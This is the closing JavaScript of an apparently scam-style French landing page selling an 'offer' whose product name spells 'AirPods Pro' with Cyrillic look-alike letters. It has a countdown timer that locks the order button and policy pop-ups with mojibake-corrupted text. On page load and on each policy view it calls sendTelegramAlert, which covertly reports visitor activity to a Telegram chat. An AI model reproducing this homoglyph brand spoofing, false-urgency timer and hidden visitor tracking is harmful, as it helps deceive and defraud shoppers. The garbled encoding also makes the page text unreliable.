                    if(orderBtn) orderBtn.disabled = true;
                    if(floatingOrderBtn) floatingOrderBtn.style.display = 'none';
                    return;
                }
                totalSeconds--;
                let h = String(Math.floor(totalSeconds / 3600)).padStart(2, "0");
                let m = String(Math.floor((totalSeconds % 3600) / 60)).padStart(2, "0");
                let s = String(totalSeconds % 60).padStart(2, "0");
                mainTimerDisplay.textContent = `${h}:${m}:${s}`;
            }, 1000);
        }
        
        const currentYearSpan = document.getElementById('currentYear');
        if (currentYearSpan) {
            currentYearSpan.textContent = new Date().getFullYear();
        }

        const homeSection = document.getElementById('home');
        if (homeSection && floatingOrderBtn) {
            const observer = new IntersectionObserver((entries) => {
                entries.forEach(entry => {
                    if (entry.isIntersecting) {
                        floatingOrderBtn.classList.remove('visible');
                    } else {
                        floatingOrderBtn.classList.add('visible');
                    }
                });
            }, { threshold: 0.1 }); 
            observer.observe(homeSection);
        }

        const logoArea = document.getElementById('logoArea');
        const logos = [document.getElementById('logoImg1'), document.getElementById('logoImg2')];
        let currentLogo = 0;
        if(logoArea && logos.every(l => l)) {
            logoArea.addEventListener('click', () => {
                logos[currentLogo].classList.remove('active');
                currentLogo = (currentLogo + 1) % logos.length;
                logos[currentLogo].classList.add('active');
                document.getElementById('topNavMenu').classList.toggle('nav-open');
            });
        }

        const policyModal = document.getElementById('policyModal');
        const policyTitle = document.getElementById('policyTitle');
        const policyText = document.getElementById('policyText');
        const policyLinks = document.querySelectorAll('.policy-link');
        
        const policies = {
            shipping: {
                title: 'Politique de Livraison',
                text: `Nous nous effor√ßons de traiter et d'exp√©dier toutes les commandes dans un d√©lai de 1 √† 2 jours ouvrables. La livraison standard prend g√©n√©ralement 5 √† 7 jours ouvrables. Vous recevrez un num√©ro de suivi par e-mail une fois votre commande exp√©di√©e. Les frais de livraison sont calcul√©s au moment du paiement.`
            },
            returns: {
                title: 'Politique de Retour',
                text: `Si vous n'√™tes pas enti√®rement satisfait de votre achat, vous pouvez retourner le produit dans les 30 jours suivant la r√©ception pour un remboursement complet ou un √©change. Le produit doit √™tre dans son √©tat d'origine et avec son emballage. Veuillez contacter notre service client pour initier le processus de retour.`
            }
        };

        policyLinks.forEach(link => {
            link.addEventListener('click', (e) => {
                e.preventDefault();
                const policyKey = e.target.getAttribute('data-policy');
                if (policies[policyKey] && policyModal && policyTitle && policyText) {
                    policyTitle.innerText = policies[policyKey].title;
                    policyText.innerText = policies[policyKey].text;
                    policyModal.style.display = 'flex';
                    sendTelegramAlert('Consultation de politique', { type: policyKey });
                }
            });
        });

        sendTelegramAlert('Page "Offre –ê—ñ–≥–†–æd—ï –†–≥–æ  2" charg√©e');
    });

    </script>

</body>
</html>

